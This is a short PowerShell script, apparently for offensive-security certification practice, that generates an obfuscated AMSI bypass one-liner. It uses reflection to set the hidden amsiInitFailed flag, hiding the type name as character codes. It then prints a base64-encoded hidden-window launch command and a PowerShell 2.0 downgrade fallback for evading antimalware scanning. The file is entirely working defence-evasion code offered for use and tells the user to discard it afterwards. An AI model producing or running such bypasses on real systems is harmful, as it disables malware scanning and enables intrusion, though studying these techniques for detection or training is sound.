# OSEP - AMSI bypass one-liner generator
# Run once to print raw + encoded forms, then discard this file.

$p1 = '$f=(([scriptblock].Assembly.GetTypes()|?{$_.Name-eq(-join[char[]]@(65,109,115,105,85,116,105,108,115))})[0]'
$p2 = '.GetFields(40)|?{$_.FieldType-eq[bool]-and$_.Name.Length-eq14})[0];$sv='
$p3 = "'SetValue';`$f.`$sv(`$null,`$true)"
$raw = $p1 + $p2 + $p3

$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($raw))

Write-Host "[RAW]"
Write-Host $raw
Write-Host ""
Write-Host "[ENC]"
Write-Host "powershell -nop -w hidden -enc $enc"
Write-Host ""
Write-Host "[PS2 FALLBACK - no AMSI in PS 2.0]"
Write-Host "powershell -version 2 -nop -w hidden -Command `"<payload>`""
